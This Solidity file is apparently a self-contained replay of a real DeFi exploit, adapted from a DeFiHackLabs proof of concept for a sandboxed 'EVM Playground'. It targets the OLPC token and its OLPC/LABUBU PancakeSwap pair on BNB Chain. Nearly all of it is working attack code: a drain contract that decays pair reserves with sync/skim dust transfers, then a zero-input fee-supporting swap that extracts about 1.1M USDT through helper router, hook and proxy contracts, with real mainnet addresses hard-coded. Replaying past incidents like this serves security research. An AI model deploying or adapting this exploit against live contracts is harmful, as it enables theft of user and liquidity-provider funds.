// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2026-06-OLPC).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker = address(this)) and relies on cheatcodes (vm.store to tax-exempt a
// locally-deployed proxy, deal to mint OLPC). This is a faithful self-contained
// copy: the 4 helper contracts are copied verbatim; OLPCDrain reproduces the test's
// setUp wiring + testExploit body in run(). The two cheatcodes are performed by the
// recorder instead (dealToken OLPC → this; storeSlot tax-exempts the proxy, which is
// deployed by the recorder as helper:0 so its address is known for the mapping slot).
//
// Root cause: OLPC's owner set decimalsValue to a huge value, so tiny dust transfers
// force large OLPC/LABUBU pair-reserve decay via the token's sync/skim price hook. A
// Pancake supporting-fee swap with amountIn = 0 then reads the inflated pair OLPC
// balance as input and releases LABUBU, routed through WBNB into ~1.1M USDT.

address constant OLPC = 0x58815CDF9955121a6274680ab396a36FC9e00000;
address constant LABUBU = 0x3494dfE19b721DAC6c5c8d7470c8F89548177777;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant OLPC_LABUBU_PAIR = 0xedB7DCB4cDFEc957F8Df5cBf5E94229a6CC9F365;
address constant SKIM_RECEIVER = 0xc0F1Ef7FE2ae3AAD0175af192713d36eD151755a;
address constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
bytes4 constant HOOK_APPLY_SELECTOR = 0xe172f16c;
bytes4 constant HOOK_PASS_THROUGH_SELECTOR = 0x8f2de77d;
bytes4 constant PROXY_SWAP_SELECTOR = 0xb1ca4936;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface ICustomToken {
    function decimalsValue() external view returns (uint256);
}

interface IPancakePair {
    function sync() external;
    function skim(address to) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract OLPCDrain {
    TaxExemptBridgeProxy private proxy;

    // proxy is deployed by the recorder (helper:0) so its address is known when the
    // recorder tax-exempts it via storeSlot before run() executes.
    constructor(address proxy_) {
        proxy = TaxExemptBridgeProxy(payable(proxy_));
    }

    function run() external {
        // --- setUp wiring (deploy the rest of the machinery, wire hooks/approvals) ---
        BridgeSwapRouter bridgeRouter = new BridgeSwapRouter(address(proxy));
        PassThroughBridgeHook olpcHook = new PassThroughBridgeHook(OLPC);
        LabubuFeeHook labubuFeeHook = new LabubuFeeHook();

        bridgeRouter.setHook(OLPC, address(olpcHook));
        bridgeRouter.setHook(LABUBU, address(labubuFeeHook));
        proxy.approveToken(LABUBU, address(bridgeRouter));
        proxy.approveToken(LABUBU, PANCAKE_ROUTER);

        // step 1: seed the pair and force OLPC reserves through the sync/skim decay.
        uint256 reserveDecayTargetDivisor = 10;
        IERC20(OLPC).transfer(OLPC_LABUBU_PAIR, 1 ether);
        uint256 dustTransfer = _initialDustTransfer(reserveDecayTargetDivisor);
        for (uint256 i = 0; i < 20; i++) {
            IPancakePair(OLPC_LABUBU_PAIR).sync();
            IERC20(OLPC).transfer(OLPC_LABUBU_PAIR, dustTransfer);
            IPancakePair(OLPC_LABUBU_PAIR).skim(SKIM_RECEIVER);
            dustTransfer = dustTransfer / reserveDecayTargetDivisor;
        }

        // step 2: final OLPC transfer leaves ~8.1 OLPC above reserves for the fee swap.
        IPancakePair(OLPC_LABUBU_PAIR).sync();
        IERC20(OLPC).transfer(OLPC_LABUBU_PAIR, 9 ether);

        // step 3: the bridge wrapper calls Pancake with amountIn = 0; Pancake infers
        // input from the pair's excess OLPC balance, releasing LABUBU → WBNB → USDT.
        bridgeRouter.swap(OLPC, 0, 1, USDT_TOKEN, address(this), 781_328_217_393);
    }

    function _initialDustTransfer(uint256 reserveDecayTargetDivisor) private view returns (uint256) {
        uint256 olpcSellNetNumerator = 9000;
        uint256 olpcSellNetDenominator = 10_000;
        uint256 pairBalance = IERC20(OLPC).balanceOf(OLPC_LABUBU_PAIR);
        uint256 targetBalance = pairBalance / reserveDecayTargetDivisor;
        uint256 burnScale = ICustomToken(OLPC).decimalsValue();
        uint256 skimAmount = _roundDiv(pairBalance - targetBalance, burnScale - 1);
        return (skimAmount * olpcSellNetDenominator) / olpcSellNetNumerator;
    }

    function _roundDiv(uint256 numerator, uint256 denominator) private pure returns (uint256) {
        return (numerator + denominator / 2) / denominator;
    }
}

// ------------------------------------------------------------------
// Helper machinery — copied verbatim from OLPC_exp.sol
// ------------------------------------------------------------------

contract BridgeSwapRouter {
    mapping(address => address) public hookAddress;
    address public proxyContractAddress;

    constructor(address proxy) {
        proxyContractAddress = proxy;
    }

    function setHook(address token, address hook) external {
        hookAddress[token] = hook;
        IERC20(token).approve(hook, type(uint256).max);
    }

    function swap(
        address token,
        uint256 amount,
        uint256 targetNetwork,
        address targetToken,
        address targetAddress,
        uint256 swapBridgeAmount
    ) external returns (uint256) {
        require(targetToken == USDT_TOKEN || targetToken == LABUBU, "Invalid tokenOut");

        uint256 balanceBefore = IERC20(token).balanceOf(address(this));
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        uint256 received = IERC20(token).balanceOf(address(this)) - balanceBefore;

        address inputHook = hookAddress[token];
        _callHook(inputHook, HOOK_APPLY_SELECTOR, msg.sender, token, targetToken, received);

        uint256 bridgeAmount;
        if (token == LABUBU) {
            bridgeAmount = received;
        } else {
            IERC20(token).approve(PANCAKE_ROUTER, received);

            uint256 bridgeBefore = IERC20(LABUBU).balanceOf(proxyContractAddress);
            address[] memory firstPath = new address[](2);
            firstPath[0] = token;
            firstPath[1] = LABUBU;
            IPancakeRouter(payable(PANCAKE_ROUTER))
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    received, 1, firstPath, proxyContractAddress, swapBridgeAmount
                );
            bridgeAmount = IERC20(LABUBU).balanceOf(proxyContractAddress) - bridgeBefore;

            IERC20(LABUBU).transferFrom(proxyContractAddress, address(this), bridgeAmount);
        }

        bridgeAmount = _callHook(inputHook, HOOK_PASS_THROUGH_SELECTOR, msg.sender, LABUBU, targetToken, bridgeAmount);

        address bridgeHook = hookAddress[LABUBU];
        bridgeAmount = _callHook(bridgeHook, HOOK_APPLY_SELECTOR, address(0), LABUBU, targetToken, bridgeAmount);

        IERC20(LABUBU).transfer(proxyContractAddress, bridgeAmount);

        address[] memory route = new address[](3);
        route[0] = LABUBU;
        route[1] = WBNB_TOKEN;
        route[2] = targetToken;
        return _callProxySwap(targetNetwork, route, targetAddress, bridgeAmount, swapBridgeAmount);
    }

    function _callHook(
        address hook,
        bytes4 selector,
        address account,
        address token,
        address targetToken,
        uint256 amount
    ) private returns (uint256) {
        (bool ok, bytes memory ret) = hook.call(abi.encodeWithSelector(selector, account, token, targetToken, amount));
        require(ok, "hook failed");
        return ret.length >= 32 ? abi.decode(ret, (uint256)) : amount;
    }

    function _callProxySwap(
        uint256 targetNetwork,
        address[] memory route,
        address targetAddress,
        uint256 bridgeAmount,
        uint256 swapBridgeAmount
    ) private returns (uint256) {
        (bool ok, bytes memory ret) = proxyContractAddress.call(
            abi.encodeWithSelector(
                PROXY_SWAP_SELECTOR, PANCAKE_ROUTER, bridgeAmount, targetNetwork, route, targetAddress, swapBridgeAmount
            )
        );
        require(ok, "proxy swap failed");
        return ret.length >= 32 ? abi.decode(ret, (uint256)) : bridgeAmount;
    }
}

contract PassThroughBridgeHook {
    address public immutable token;

    constructor(address hookedToken) {
        token = hookedToken;
    }

    fallback(bytes calldata input) external returns (bytes memory) {
        require(msg.sig == HOOK_APPLY_SELECTOR || msg.sig == HOOK_PASS_THROUGH_SELECTOR, "unknown hook selector");
        (, address tokenIn,, uint256 amount) = abi.decode(input[4:], (address, address, address, uint256));
        require(tokenIn == token || tokenIn == LABUBU, "unexpected hook token");
        require(msg.sig != HOOK_APPLY_SELECTOR || amount == 0, "unexpected OLPC hook amount");
        return abi.encode(amount);
    }
}

contract LabubuFeeHook {
    fallback(bytes calldata input) external returns (bytes memory) {
        require(msg.sig == HOOK_APPLY_SELECTOR, "unknown fee hook selector");
        (, address tokenIn,, uint256 amount) = abi.decode(input[4:], (address, address, address, uint256));
        require(tokenIn == LABUBU, "unexpected fee token");

        uint256 sellTaxPercent = 1805;
        uint256 nodeRate = 500;
        uint256 basePercent = 10_000;
        uint256 totalTax = (amount * sellTaxPercent) / basePercent;
        uint256 nodeFee = (amount * nodeRate) / basePercent;
        uint256 burnFee = totalTax - nodeFee;
        IERC20(LABUBU).transferFrom(msg.sender, BURN_ADDRESS, nodeFee);
        IERC20(LABUBU).transferFrom(msg.sender, BURN_ADDRESS, burnFee);

        return abi.encode(amount - totalTax);
    }
}

contract TaxExemptBridgeProxy {
    function approveToken(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    fallback(bytes calldata input) external returns (bytes memory) {
        require(msg.sig == PROXY_SWAP_SELECTOR, "unknown proxy selector");
        (address router, uint256 amount,, address[] memory path, address profitReceiver, uint256 deadline) =
            abi.decode(input[4:], (address, uint256, uint256, address[], address, uint256));

        uint256 beforeBalance = IERC20(path[path.length - 1]).balanceOf(profitReceiver);
        IERC20(path[0]).approve(router, amount);
        IPancakeRouter(payable(router))
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 1, path, profitReceiver, deadline);
        return abi.encode(IERC20(path[path.length - 1]).balanceOf(profitReceiver) - beforeBalance);
    }
}
